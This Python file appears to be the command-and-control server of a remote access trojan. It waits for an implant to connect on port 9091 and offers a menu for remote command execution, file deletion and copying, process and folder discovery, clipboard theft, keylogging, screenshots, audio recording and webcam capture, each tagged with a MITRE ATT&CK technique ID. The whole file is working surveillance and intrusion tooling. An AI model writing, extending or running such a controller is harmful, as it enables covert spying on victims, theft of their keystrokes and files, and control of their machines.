import socket
import datetime

sock = socket.socket()
sock.bind(('', 9091))
sock.listen(1)
conn, addr = sock.accept()
print ('connected:', addr)


# T1082
def os_info():
    conn.send('os'.encode())
    time = datetime.datetime.now()
    filename = 'system-info-' + time.strftime("%d-%m-%Y-%H:%M:%S") + '.txt'
    info = open(filename, 'wb')
    while True:
        file = conn.recv(1024)
        if b'done' in file or not file:
            break
        else:
            info.write(file)
    print('Saved as:',filename)
    info.close()


# T1105
def remove_file():
    conn.send('rm'.encode())
    location = input('Enter location:')
    conn.send(location.encode())
    answer = conn.recv(1024).decode()
    print(answer)


# T1057
def process_discovery():
    conn.send('pd'.encode())
    time = datetime.datetime.now()
    filename = 'processes-'+time.strftime("%d-%m-%Y-%H:%M:%S") + '.txt'
    proc = open(filename, 'wb')
    while True:
        file = conn.recv(1024)
        if b'done' in file or not file:
            break
        else:
            proc.write(file)
    print('Saved as:', filename)
    proc.close()

# T1059
def CLI():
    conn.send('cli'.encode())
    command = input('Enter command:')
    conn.send(command.encode())
    answear = conn.recv(1024).decode()
    print(answear)


# T1105
def copy_file():
    filename = input('Enter file name to write:')
    filetodown = open(filename, "wb")
    conn.send('cp'.encode())
    path = input('Enter location:')
    conn.send(path.encode())
    while True:
        file = conn.recv(1024)
        if b'done' in file or not file:
            break
        else:
            filetodown.write(file)
    print("Saved as", filename)
    filetodown.close()


# T1083
def folder_discovery():
    conn.send('ds'.encode())
    location = input('Enter location:')
    conn.send(location.encode())
    directory = conn.recv(4096).decode()
    print(directory)


# T1115
def clipboard_data():
    conn.send('cd'.encode())
    buffer = conn.recv(4096).decode()
    print('Buffer: ',buffer)


# T1056
def keylogger():
    conn.send('kl'.encode())
    amount = input("Enter amount:")
    print('Wait. Collecting data...')
    conn.send(amount.encode())
    keys = conn.recv(1024).decode()
    print(keys)


# T1113
def screenshot():
    conn.send('scr'.encode())
    time = datetime.datetime.now()
    filename = time.strftime("%d-%m-%Y-%H:%M:%S")+'.jpg'
    file = open(filename,'wb')
    while True:
        image = conn.recv(1024)
        if b'done' in image or not image:
            break
        else:
            file.write(image)
    print("Saved as",filename)


# T1213
def audio_capture():
    conn.send('audio'.encode())
    time = datetime.datetime.now()
    filename = time.strftime("%d-%m-%Y-%H:%M:%S") + '.wav'

    duration = input('Enter duration:')
    conn.send(duration.encode())
    print('Wait a moment...')
    file = open(filename, 'wb')
    while True:
        audio = conn.recv(1024)
        if not audio or b'done' in audio:
            break
        else:
            file.write(audio)
    print("Saved as", filename)


# T1125
def web_cam():
    conn.send('webcam'.encode())
    time = datetime.datetime.now()
    filename = time.strftime("%d-%m-%Y-%H:%M:%S") + '.avi'
    file = open(filename, 'wb')
    while True:
        video = conn.recv(1024)
        if not video or b'done' in video:
            break
        else:
            file.write(video)
    print('Saved as', filename)


while True:
    print('______________________________________________________')
    print('Choose what to do from list:')
    print('1 - OS info; 2 - remove file; 3 - process discovery;')
    print('4 - CLI; 5 - copy file; 6 - folder discovery;')
    print('7 - clipboard data; 8 - key logger; 9 - screenshot;')
    print('10 - audio capture; 11 - webcam capture; 12 - exit')
    command = input('>>')
    if command == '1':
        os_info()
    if command == '2':
        remove_file()
    if command == '3':
        process_discovery()
    if command =='4':
        CLI()
    if command == '5':
        copy_file()
    if command == '6':
        folder_discovery()
    if command == '7':
        clipboard_data()
    if command == '8':
        keylogger()
    if command == '9':
        screenshot()
    if command == '10':
        audio_capture()
    if command == '11':
        web_cam()
    if command == '12':
        conn.send('exit'.encode())
        print('End.')
        break
conn.close()

